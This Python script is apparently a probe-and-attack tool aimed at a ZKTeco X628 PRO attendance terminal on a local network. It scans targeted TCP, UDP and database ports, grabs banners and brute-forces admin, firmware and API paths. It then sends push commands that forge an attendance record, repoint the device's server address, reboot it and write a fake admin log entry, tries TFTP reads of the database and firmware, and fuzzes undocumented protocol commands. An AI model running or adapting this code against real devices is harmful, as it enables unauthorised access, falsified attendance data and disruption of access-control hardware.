# -*- coding: utf-8 -*-
"""
ZK X628 PRO FW 6.60 - TARGETED DEEP PROBE (parallel)
Focus on high-value ports only, not full 65535.
"""
import sys, os, socket, struct, time, json, re, threading, queue
sys.stdout.reconfigure(encoding='utf-8')

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, SCRIPT_DIR)

DEVICE_IP = '172.16.0.214'
results_lock = threading.Lock()
found = {'tcp': [], 'udp': [], 'http': [], 'raw': [], 'protocols': []}

# === TARGETED PORT LIST (only high-value ones, not 65535) ===
# Skip the obvious web/standard ports we already tested in 100+ scan
# Focus on: ZK vendor, embedded firmware, debug, vendor SDK, IPC, RPC
TARGET_TCP = [
    # ZK vendor (alt ports)
    4370, 4371, 4372, 4373, 4374, 4375, 4376, 4380, 4390,
    # Cloud/ADMS variants
    6000, 6001, 6002, 7000, 7001, 7002, 7777, 7778,
    # Embedded debug
    2323, 2222, 4222, 5555, 6666, 7654, 7778,
    # Vendor specific
    8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089,
    8443, 8888, 8889, 8899, 9000, 9001, 9090, 9091,
    # ADMS / Cloud
    9999, 10000, 10001, 10080, 12345, 15000, 20000,
    # Firmware/IPC
    2400, 2600, 2701, 3000, 3001, 3002, 3333, 3500,
    4000, 4444, 4567, 5000, 5001, 5555, 6000, 6543,
    # Misc
    37777, 37778, 37779, 38800, 40000, 50000, 60000,
]

def tcp_probe(ip, port, timeout=0.8):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.close()
        return True
    except:
        return False

def tcp_probe_with_recv(ip, port, timeout=1.5):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        # Try to receive banner
        s.send(b'\x00' * 4)
        time.sleep(0.3)
        try:
            data = s.recv(512)
        except:
            data = b''
        s.close()
        return data
    except Exception as e:
        return None

def http_probe(ip, port, paths, timeout=3):
    results = []
    for path in paths:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((ip, port))
            req = f'GET {path} HTTP/1.0\r\nHost: {ip}\r\nUser-Agent: probe\r\n\r\n'.encode()
            s.send(req)
            data = b''
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk: break
                    data += chunk
                    if len(data) > 4096: break
            except socket.timeout:
                pass
            s.close()
            if data and (b'HTTP' in data[:50] or b'<html' in data.lower()):
                results.append((path, data[:200]))
        except:
            pass
    return results

print('=' * 70)
print(f'ZK X628 PRO FW 6.60 - TARGETED DEEP PROBE ({DEVICE_IP})')
print('=' * 70)

# === PHASE 1: Parallel TCP scan on targeted ports ===
print(f'\n[Phase 1] Parallel TCP probe {len(TARGET_TCP)} ports...')

def scan_worker(q):
    while True:
        try:
            port = q.get_nowait()
        except queue.Empty:
            return
        if tcp_probe(DEVICE_IP, port, 0.5):
            with results_lock:
                found['tcp'].append(port)
                print(f'  TCP/{port} OPEN')

q = queue.Queue()
for p in TARGET_TCP:
    q.put(p)

# 50 threads for fast parallel scan
threads = []
for _ in range(50):
    t = threading.Thread(target=scan_worker, args=(q,))
    t.daemon = True
    t.start()
    threads.append(t)

for t in threads:
    t.join()

print(f'  → TCP: {sorted(found["tcp"])}')

# === PHASE 2: For each open port, try to get banner ===
print('\n[Phase 2] Banner grab on open ports...')
for port in found['tcp']:
    data = tcp_probe_with_recv(DEVICE_IP, port, 1.5)
    if data:
        print(f'  TCP/{port} banner: {data[:80]!r}')
        found['raw'].append((port, data.hex()))
    else:
        print(f'  TCP/{port}: silent (no banner)')

# === PHASE 3: HTTP probe on every open port ===
print('\n[Phase 3] HTTP probe on all open ports...')
PATHS = [
    '/', '/index.html', '/admin', '/login', '/device', '/cgi-bin',
    '/iclock', '/iclock/cdata', '/iclock/getrequest', '/iclock/devicecmd',
    '/api', '/api/device', '/api/users', '/api/attlog',
    '/cgi-bin/record', '/cgi-bin/options', '/cgi-bin/firmware',
    '/firmware', '/firmware.bin', '/backup', '/download',
    '/cgi-bin/zkip', '/api/v1', '/v1',
]
for port in found['tcp']:
    print(f'  Probing port {port}...')
    res = http_probe(DEVICE_IP, port, PATHS, 2)
    for path, data in res:
        print(f'    {port}{path}: {data[:80]!r}')
        found['http'].append((port, path, data[:200].hex()))

# === PHASE 4: Try ADMS-style push injection on port 4370 ===
print('\n[Phase 4] ADMS-style PUSH command injection on 4370...')
PUSH_CMDS = [
    b'C:1:1 INFO\r\n',
    b'C:2:1 DATA UPDATE ATTLOG PIN=1\t2026-09-14 23:00:00\t0\t0\t0\t0\t0\r\n',
    b'C:3:1 PUT OPTIONS ServerAddr=127.0.0.1\tServerPort=8088\tRealtime=1\tTransFlag=TransData AttLog OpLog\r\n',
    b'C:4:1 CONTROL DEVICE REBOOT\r\n',
    b'C:5:1 RELOAD\r\n',
    b'C:6:1 OP LOG 1\tAdmin\t2026-09-14 23:00:00\t0\r\n',
    b'GET / HTTP/1.0\r\n\r\n',  # HTTP on ZK port
    b'POST /iclock/cdata HTTP/1.0\r\nContent-Length: 0\r\n\r\n',
]

for cmd in PUSH_CMDS:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((DEVICE_IP, 4370))
        s.send(cmd)
        try:
            resp = s.recv(1024)
            print(f'  → Sent {cmd[:40]!r}')
            print(f'  ← Got  {resp[:60]!r}')
            found['protocols'].append((cmd[:40], resp[:60].hex()))
        except socket.timeout:
            print(f'  → Sent {cmd[:40]!r} (timeout)')
        s.close()
    except Exception as e:
        print(f'  → {cmd[:40]!r}: ERROR {e}')

# === PHASE 5: TFTP firmware probe ===
print('\n[Phase 5] TFTP firmware read attempt...')
def tftp_rrq(ip, filename):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(3)
        req = struct.pack('!H', 1) + filename.encode() + b'\x00octet\x00'
        s.sendto(req, (ip, 69))
        data, _ = s.recvfrom(516)
        s.close()
        return data
    except:
        return None

for fn in ['zkdb.db', 'firmware.bin', 'config.ini', 'main.bin', 'app.bin']:
    r = tftp_rrq(DEVICE_IP, fn)
    if r:
        opcode = struct.unpack('!H', r[:2])[0]
        print(f'  TFTP {fn}: opcode={opcode}, {len(r)} bytes')
        if opcode == 3:  # DATA
            print(f'    DATA: {r[4:64]!r}')

# === PHASE 6: UDP probe on key ports ===
print('\n[Phase 6] UDP probe on key ports...')
UDP_PORTS = [53, 67, 68, 69, 137, 161, 162, 445, 514, 520, 1024,
             1645, 1812, 1900, 2049, 4370, 5060, 5353, 7777, 8080]
for port in UDP_PORTS:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(1.5)
        # Send ZK-style packet
        s.sendto(b'\x00' * 8, (DEVICE_IP, port))
        try:
            data, _ = s.recvfrom(1024)
            print(f'  UDP/{port} RESPONSE: {data[:60]!r}')
            found['udp'].append(port)
        except socket.timeout:
            pass
        s.close()
    except:
        pass

# === PHASE 7: Try direct database access ===
print('\n[Phase 7] Database protocol probes...')
DB_PORTS = [1433, 1521, 3306, 5432, 6379, 9200, 27017]
for port in DB_PORTS:
    if tcp_probe(DEVICE_IP, port, 1.0):
        print(f'  DB PORT {port} OPEN!')

# === PHASE 8: Try ZK firmware update flow (PREPARE_DATA → DATA → FREE) ===
print('\n[Phase 8] ZK firmware update flow attempt...')
try:
    import pyzk
    z = pyzk.ZK(DEVICE_IP, port=4370, timeout=5)
    z.connect()
    print('  Connected via pyzk')

    # Try various undocumented commands
    undocumented = [0x0001, 0x0007, 0x0087, 0x00BC, 0x00BD, 0x00BE, 0x00BF,
                    0x2707, 0x2708, 0x2709, 0x270A, 0x270B, 0x270C, 0x270D,
                    0x270E, 0x270F, 0x2710, 0x2713, 0x2714, 0x2715,
                    0x2740, 0x2741, 0x2742, 0x2743, 0x2744, 0x2745,
                    0x2750, 0x2751, 0x2752, 0x2753, 0x2754, 0x2755]
    for cmd in undocumented:
        try:
            resp = z._ZK__send_command(cmd, b'')
            print(f'  CMD 0x{cmd:04X}: {resp!r}')
        except Exception as e:
            pass

    z.disconnect()
except Exception as e:
    print(f'  pyzk fail: {e}')

# === SUMMARY ===
print('\n' + '=' * 70)
print('FINAL SUMMARY')
print('=' * 70)
print(f'TCP open: {sorted(found["tcp"])}')
print(f'UDP open: {sorted(found["udp"])}')
print(f'HTTP responses: {len(found["http"])}')
print(f'Protocol responses: {len(found["protocols"])}')
for port, t, d in found['http']:
    print(f'  HTTP {port}: {d[:80]}')
for cmd, resp in found['protocols']:
    print(f'  Proto {cmd!r}: {resp}')

with open('D:\\chamcong\\zk_deep_probe_result.json', 'w') as f:
    json.dump({k: list(v) if isinstance(v, set) else v for k, v in found.items()},
              f, indent=2, default=str)
print('\nSaved: D:\\chamcong\\zk_deep_probe_result.json')
